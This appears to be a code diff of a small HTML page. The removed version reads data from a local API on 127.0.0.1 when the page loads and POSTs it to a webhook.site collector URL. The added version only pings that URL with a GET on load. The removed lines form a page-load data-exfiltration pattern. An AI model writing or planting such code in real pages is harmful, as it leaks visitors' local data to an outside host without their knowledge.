@@ -3,45 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Data Fetch and Forward</title>
+    <title>Webhook GET Request</title>
     <script>
-        async function fetchDataAndForward() {
+        async function fetchWebhook() {
             try {
-                // Perform initial GET request to webhook.site
-                let initialResponse = await fetch('https://webhook.site/2f8dcd8e-c909-4391-9b93-138dd6abc1ee');
-                if (!initialResponse.ok) {
-                    throw new Error('Initial request failed');
-                }
-                console.log('Initial GET request successful');
-                
-                // Fetch data from local API
-                let response = await fetch('http://127.0.0.1:1337/api/entries');
+                // Perform GET request to webhook.site
+                let response = await fetch('https://webhook.site/2f8dcd8e-c909-4391-9b93-138dd6abc1ee');
                 if (!response.ok) {
-                    throw new Error('Network response was not ok');
+                    throw new Error('Request failed');
                 }
-                
-                let data = await response.json();
-                console.log('Fetched Data:', data);
-                
-                // Send data to webhook
-                await fetch('https://webhook.site/2f8dcd8e-c909-4391-9b93-138dd6abc1ee', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(data)
-                });
-                
-                console.log('Data successfully forwarded');
+                console.log('GET request to webhook successful');
             } catch (error) {
                 console.error('Error:', error);
             }
         }
         
-        window.onload = fetchDataAndForward;
+        window.onload = fetchWebhook;
     </script>
 </head>
 <body>
-    <h1>Fetching and Forwarding Data...</h1>
+    <h1>Performing GET Request to Webhook...</h1>
 </body>
 </html>
